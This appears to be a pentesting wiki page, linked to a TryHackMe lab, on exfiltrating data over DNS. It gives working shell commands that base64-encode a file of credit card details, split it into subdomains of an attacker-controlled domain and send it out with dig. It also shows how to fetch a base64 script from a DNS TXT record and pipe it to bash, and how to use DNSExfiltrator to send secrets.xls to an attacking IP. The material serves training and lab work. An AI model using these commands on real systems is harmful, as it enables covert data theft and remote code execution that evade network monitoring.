# Over DNS

## Theory
The DNS protocol is a common protocol and Its primary purpose is to resolve domain names to IP addresses and vice versa. Even though the DNS protocol is not designed to transfer data, threat actors found a way to abuse and move data over it.  
Since DNS is not a transport protocol, many organizations don't regularly monitor the DNS protocol! The DNS protocol is allowed in almost all firewalls in any organization network. For those reasons, threat actors prefer using the DNS protocol to hide their communications.

### Limitations

The DNS protocol has limitations that need to be taken into consideration, which are as follows,

- The maximum length of the Fully Qualified FQDN domain name (including .separators) is 255 characters.
- The subdomain name (label) length must not exceed 63 characters (not including .com, .net, etc).

### Scenario

Now let's discuss the Data Exfiltration over DNS requirements and steps, which are as follows:  
1 - An attacker registers a domain name, for example, tunnel.com  
2 - The attacker sets up tunnel.com's NS record points to a server that the attacker controls.  
3 - The malware or the attacker sends sensitive data from a victim machine to a domain name they control—for example, passw0rd.tunnel.com, where passw0rd is the data that needs to be transferred.  
4 - The DNS request is sent through the local DNS server and is forwarded through the Internet.  
5 - The attacker's authoritative DNS (malicious server) receives the DNS request.  
6 - Finally, the attacker extracts the password from the domain name.  

## Practice

We concider that a NS record named `t1.tunnel.com` as been registred. It's poiting the Attacking IP.
{% tabs %}
{% tab title="Manualy" %}
In order to receive any DNS request on the attacking machine, we need to capture the network traffic for any incoming UDP/53 packets using the [tcpdump](https://github.com/the-tcpdump-group/tcpdump) tool.  
```bash
v4resk@kali$ sudo tcpdump -i eth0 udp port 53 -v 
```
On the victim machine, we first encode datas that need to be send, and split it into one or multiple DNS requests depending on the output's length (DNS limitations) and attach it as a subdomain name.
```bash
# Methode 1
victim@pwnd.lab$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.t1.tunnel.com/' > toExfiltrate.txt
victim@pwnd.lab$ cat toExfiltrate.txt
TmFtZTogVEhNLXVzZX.t1.tunnel.com
IKQWRkcmVzczogMTIz.t1.tunnel.com
NCBJbnRlcm5ldCwgVE.t1.tunnel.com
hNCkNyZWRpdCBDYXJk.t1.tunnel.com
OiAxMjM0LTEyMzQtMT.t1.tunnel.com
IzNC0xMjM0CkV4cGly.t1.tunnel.com
ZTogMDUvMDUvMjAyMg.t1.tunnel.com
pDb2RlOiAxMzM3Cg==.t1.tunnel.com

#Methode 2
victim@pwnd.lab$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ > toExfiltrate.txt
victim@pwnd.lab$ cat toExfiltrate.txt
TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.t1.tunnel.com
```
In order to send this datas, on the compromised host we can do:
```bash
victim@pwnd.lab$ cat toExfiltrate.txt | awk '{print "dig +short " $1}' | bash
```

Finally, on the attacking machine, we can decrypt datas as follow:
```bash
v4resk@kali$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.t1.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
```
{% endtab %}

{% tab title="Command Execution" %}
Let's see how can tunneling code execution via the DNS protocol.
We first need to create a TXT record containing our script encoded in base64. Let's take`script.tunnel.com` as example.

```bash
#Check if the TXT record is well configured
victim@pwnd.lab$ dig +short -t TXT script.tunnel.com
"IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo="

#Execution over DNS
victim@pwnd.lab$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
```
{% endtab %}

{% tab title="DNSExfiltrator" %}
[DNSExfiltrator](https://github.com/Arno0x/DNSExfiltrator) allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.  
On the attacking machine we do:
```bash
v4resk@kali$ ./dnsexfiltrator.py -d mydomain.com -p password
```
On the compromised host:
```bash
dnsExfiltrator.exe secrets.xls mydomain.com password s=ATTACKING_IP t=500
```
{% endtab %}

### DNS Tunneling
An other methode is to tunneling other protocols over DNS. Check this page for more details.
{% content-ref url="../pivoting/dnsTunneling.md" %}
[dnsTunneling.md](../pivoting/dnsTunneling.md)
{% endcontent-ref %}

{% endtabs %}


## Resources
{% embed url="https://tryhackme.com/room/dataxexfilt" %}
